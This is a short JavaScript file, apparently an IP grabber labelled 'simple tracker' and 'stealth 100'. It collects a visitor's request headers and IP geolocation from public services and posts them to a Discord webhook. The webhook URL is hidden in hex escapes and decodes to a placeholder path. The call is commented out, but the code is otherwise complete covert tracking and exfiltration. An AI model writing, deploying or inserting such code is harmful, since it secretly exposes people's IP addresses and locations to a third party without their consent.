// simple tracker
// stealth 100

async function fetch_info() {
    const ip_res = await fetch("http://httpbin.org/headers");
    const ip_data = await ip_res.json();
    
    const hd_res = await fetch("http://ip-api.com/json/");
    const hd_data = await hd_res.json();
    
    const data = {"001": ip_data, "002": hd_data}

    const webhook_url = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x69\x5f\x61\x6d\x5f\x6e\x6f\x74\x5f\x6c\x65\x61\x6b\x69\x6e\x67\x5f\x6d\x79\x5f\x77\x65\x62\x68\x6f\x6f\x6b\x5f\x75\x72\x6c\x2f\x6c\x6f\x6c";
    const webhook_data = {
      content: `\n\`\`\`json\n${JSON.stringify(data, null, 2)}\`\`\``
    };

    await fetch(webhook_url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(webhook_data),
    });
}
//fetch_info();
// turn it off
